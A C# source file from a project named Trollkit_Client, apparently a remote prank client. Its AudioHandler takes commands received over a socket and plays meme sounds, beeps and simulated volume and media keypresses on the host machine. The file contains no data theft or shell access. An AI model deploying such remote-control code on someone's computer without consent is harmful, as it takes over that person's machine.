using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Interop;
using Trollkit_Library;
using Trollkit_Library.Models;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class AudioHandler : ICommandHandler
	{
		[DllImport("user32.dll")]
		static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);

		private const int NEXT_TRACK = 0xB0;
		private const int PLAY_PAUSE = 0xB3;
		private const int PREV_TRACK = 0xB1;
		private const int VOLUME_MUTE = 0xAD;
		private const int VOLUME_UP = 0xAF;
		private const int VOLUME_DOWN = 0xAE;

		private SoundPlayer soundplayer;

		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "PlayBeep":		
					return PlayBeep(obj.Value); ;
				case "Jeff":					
					return PlayJeff();
				case "WesselMove":
					return PlayWesselMove();
				case "Windows":
					return PlaywindowsSound();
				case "Horn":
					return PlayHorn();
				case "Macintosh":
					return PlayMacintosh420();
				case "Stop":
					return StopSound();
				case "VolumeUp":
					keybd_event(VOLUME_UP, 0, 0, IntPtr.Zero);
					return true;
				case "VolumeDown":
					keybd_event(VOLUME_DOWN, 0, 0, IntPtr.Zero);
					return true;
				case "Mute":
					keybd_event(VOLUME_MUTE, 0, 0, IntPtr.Zero);
					return true;
				case "PlayPause":
					keybd_event(PLAY_PAUSE, 0, 1, IntPtr.Zero);
					return true;
				case "NextTrack":
					keybd_event(NEXT_TRACK, 0, 1, IntPtr.Zero);
					return true;
				case "PreviousTrack":
					keybd_event(PREV_TRACK, 0, 1, IntPtr.Zero);
					return true;
			}
			return false;
		}

		private bool PlayBeep(string playBeep)
		{
			try
			{
				string[] values = playBeep.Split(',');

				if (values.Length == 2)
				{
					Console.Beep(int.Parse(values[0]), int.Parse(values[1]));
				}
				else
				{
					Console.Beep(500, 500);
				}

				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}

		}

		private bool PlayJeff()
		{
			try
			{
				soundplayer = new SoundPlayer(Properties.Resources.MyNameIsJeff);
				soundplayer.Play();
				return true;
			}
			catch (Exception e)
			{

				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool PlayWesselMove()
		{
			try
			{
				soundplayer = new SoundPlayer(Properties.Resources.EchtEenWesselSample);
				soundplayer.Play();
				return true;
			}
			catch (Exception e)
			{

				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool PlaywindowsSound()
		{
			try
			{
				soundplayer = new SoundPlayer(Properties.Resources.windows_10);
				soundplayer.Play();
				return true;
			}
			catch (Exception e)
			{

				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool PlayHorn()
		{
			try
			{
				soundplayer = new SoundPlayer(Properties.Resources.Horn);
				soundplayer.Play();
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool PlayMacintosh420()
		{
			try
			{
				soundplayer = new SoundPlayer(Properties.Resources.MACINTOSH_PLUS);
				soundplayer.Play();
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool StopSound()
		{
			try
			{
				if (soundplayer != null)
				{
					soundplayer.Stop();
				}
				else
				{
					BConsole.WriteLine("No music was playing, cannot stop player", ConsoleColor.DarkRed);
				}

				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Audio Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

	}
}
